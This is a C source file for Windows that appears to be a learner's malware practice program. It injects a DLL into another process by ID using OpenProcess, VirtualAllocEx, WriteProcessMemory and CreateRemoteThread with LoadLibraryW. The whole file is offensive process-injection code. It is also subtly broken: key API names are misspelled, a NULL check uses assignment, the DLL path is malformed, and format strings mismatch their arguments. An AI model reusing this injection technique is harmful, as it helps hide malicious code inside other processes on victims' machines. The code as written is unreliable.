#include <windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[+]";
const char* e = "[+]";

DWORD PID,TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllpath[MAX_PATH] = L"C:\\Users\\bob10\OneDrive\\Desktop\\Cyber security\\malware\\maleware code\\maleware righting";
size_t dllpathSize = sizeof(dllpath);


int main(int argc, char* argv[]){

    if (argc < 2){
        printf("%s usage: %s",e,argv[0]);
        return EXIT_FAILURE;
    }

PID =atoi(argv[1]);

printf("%strying to get a handel to the process,error: %ld",e,GetLastError());

hProcess= OpenProcess(PROCESS_ALL_ACCESS,FALSE, PID);

    if(hProcess == NULL) {
        printf("%sfailed to get process,error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

printf("%s got a handel to the process(%ld)\n\\--0x%p\n",k, hProcess);

rBuffer = VirtualAllocEx(hProcess,NULL, dllpathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
printf("%s allocated buffer to process memory w/ PAGE_READRIGHT permission\n",k);

    if (rBuffer == NULL){
        printf("%s coulden't create rBuffer,error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

WriteProcessMemory(hProcess, rBuffer,dllpath, dllpathSize, NULL);
    printf("%s wrote [%S] to process memory\n]",k, dllpath);  

    hKernel32 = GetModuleHandleW(L"Kernal32");

        if (hKernel32 = NULL) {
            printf("%s failed to get handel to Kernal32.dll, error: %ld",e, GetLastError());
            CloseHandle(hProcess);
            return EXIT_FAILURE;
        }

    printf("%s got a handel to Kernal32.dll\n\\--0x%p\n",k,hKernel32);

    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibaryW");

        printf("%s got the adress of LoadLibaryW()\n\\--0x%p\n",k, startThis);

    hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer,0, &TID);

        if (hThread ==NULL) {
            printf("%s failed to get a handel to thread,error:%ld",e,GetLastError());
            CloseHandle(hProcess);
            return EXIT_FAILURE;
        }

     printf("%s got a handel to the newly-crated thread (%ld)\n\\--0x%p\n",k,TID, hThread);
     printf("%s waiting for the thread to finish excuting\n",i);

    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing cleaning up....\n",k);


    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("%s finshed all done",k);
return EXIT_SUCCESS;
}